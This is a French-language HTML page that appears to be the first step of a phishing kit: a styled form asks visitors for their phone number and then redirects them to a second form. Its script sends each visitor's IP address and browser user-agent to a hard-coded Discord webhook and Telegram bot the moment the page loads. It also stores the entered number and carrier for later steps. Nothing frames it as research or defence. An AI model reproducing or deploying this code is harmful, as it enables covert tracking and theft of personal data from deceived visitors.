<!DOCTYPE html>

<style>

  .c {

    border: 2px solid #a54ffb;
  }
  .phone-wrapper {

  #flag {

    pointer-events: none;
  }
  input, select, button {

    margin: 8px 0;
    padding: 12px 12px 12px 50px; /* espace pour le drapeau */
    border: 2px solid #a54ffb;
    border-radius: 10px;
    background: transparent;
    color: white;
    font-size: 16px;
    outline: none;
    box-shadow: inset 0 0 8px #9b00ff;
    transition: 0.3s;
    box-sizing: border-box;
  }
  input:focus, select:focus {
    border-color: #f7b500;
    box-shadow: 0 0 10px #f7b500;
  }
  button {
    background: #f7b500;
    color: #2c014d;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 10px #f7b500;
    transition: 0.3s;
  }
  button:hover {
    background: #e0a600;
    box-shadow: 0 0 20px #ffcb3c;
  }
  #msg {
    color: #f88;

  }
</style>
</head>
<body>
<div class="c">
  <h1>√âtape 1 : Votre num√©ro üìû</h1>

      <span id="flag"></span>
      <input name="telephone" type="tel" placeholder="Num√©ro de t√©l√©phone" pattern="[0-9]{10}" required />
    </div>
    <button type="submit">Continuer</button>
  </form>
  <div id="msg"></div>
</div>

<script>
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
  const TELEGRAM_CHAT_ID = "-1002810249796";

  // Mapping simple des pr√©fixes ‚Üí drapeau emoji (focus France + quelques courants)
  const countryFlags = {
    '+33': 'üá´üá∑',    // France
    '06': 'üá´üá∑',     // Mobile FR sans +
    '07': 'üá´üá∑',     // Mobile FR sans +
    '+1': 'üá∫üá∏',     // US/Canada
    '+44': 'üá¨üáß',    // UK
    '+49': 'üá©üá™',    // Allemagne
    '+34': 'üá™üá∏',    // Espagne
    '+39': 'üáÆüáπ',    // Italie
    '+31': 'üá≥üá±',    // Pays-Bas
    '+32': 'üáßüá™',    // Belgique
    '+41': 'üá®üá≠',    // Suisse
    '+212': 'üá≤üá¶',   // Maroc (souvent vu en FR)
    '+216': 'üáπüá≥',   // Tunisie
    '+213': 'üá©üáø',   // Alg√©rie
    // Ajoute d'autres si besoin
  };

  function updateFlag(phoneInput) {
    const value = phoneInput.value.trim().replace(/\s/g, ''); // nettoie espaces
    const flagEl = document.getElementById('flag');
    flagEl.textContent = '';

    if (!value) return;

    // Si commence par + ‚Üí cherche code pays complet
    if (value.startsWith('+')) {
      for (const code in countryFlags) {
        if (value.startsWith(code)) {
          flagEl.textContent = countryFlags[code];
          return;
        }
      }
    } else {
      // Sinon, assume FR si 06 ou 07 (format local 10 chiffres)
      if (value.startsWith('06') || value.startsWith('07')) {
        flagEl.textContent = 'üá´üá∑';
      }
    }
  }

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip || "IP inconnue";
    } catch {
      return "IP inconnue";
    }
  }

  async function sendDiscord(embed) {
    return fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  async function sendTelegram(text) {
    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  }

  async function sendIpUaOnLoad() {
    const ip = await getIP();
    const ua = navigator.userAgent || "Inconnu";

    const discordEmbed = {
      title: "[üõú] PAGE OUVERTE [üõú]",
      color: 0x9B00FF,
      fields: [
        { name: "üì± Adresse IP", value: ip, inline: false },
        { name: "üì≤ User-Agent", value: ua, inline: false }
      ],
      timestamp: new Date().toISOString()
    };

    const telegramText =
      `[üåê] PAGE OUVERTE [üåê]\n\n` +
      `üåê Adresse IP : ${ip}\n` +
      `üåê User-Agent : ${ua}`;

    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
  }

  window.addEventListener('load', sendIpUaOnLoad);

  // Mise √† jour drapeau en live
  const phoneInput = document.querySelector('input[name="telephone"]');
  if (phoneInput) {
    phoneInput.addEventListener('input', () => updateFlag(phoneInput));
    // Check initial si d√©j√† rempli (rare mais au cas o√π)
    updateFlag(phoneInput);
  }

  document.getElementById("form1").addEventListener("submit", (e) => {
    e.preventDefault();
    localStorage.setItem("step1", JSON.stringify({
      operateur: e.target.operateur.value,
      telephone: e.target.telephone.value
    }));

    const msgEl = document.getElementById("msg");
    msgEl.style.color = "#0f0";
    msgEl.textContent = "Redirection...";

    setTimeout(() => {
      window.location.href = "formulaire.html";
    }, 1000);
  });
</script>
</body>
